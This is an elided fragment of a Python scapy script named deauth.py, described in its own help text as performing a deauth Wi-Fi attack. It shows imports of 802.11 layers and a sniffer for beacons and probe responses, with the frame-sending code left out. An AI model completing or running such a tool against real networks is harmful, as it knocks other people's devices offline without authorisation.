...
from scapy.layers.dot11 import Dot11Elt, Dot11, Dot11Deauth, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp
...
class deauth:
    ...
    def start_sniffer(self):
        ...
        stopsniff = False
        sniff(lfilter=lambda x: (x.haslayer(Dot11Beacon) or x.haslayer(Dot11ProbeResp)), stop_filter=stopsniff,
...
def main():
    ...
    parser = argparse.ArgumentParser(
        description='deauth.py - Perform a Deauth WIFI Attack - python deauth.py -i wlan0 -m 1')
...
# TODO:  https://gist.github.com/garyconstable/1dca3c32dfd05f0bd15f
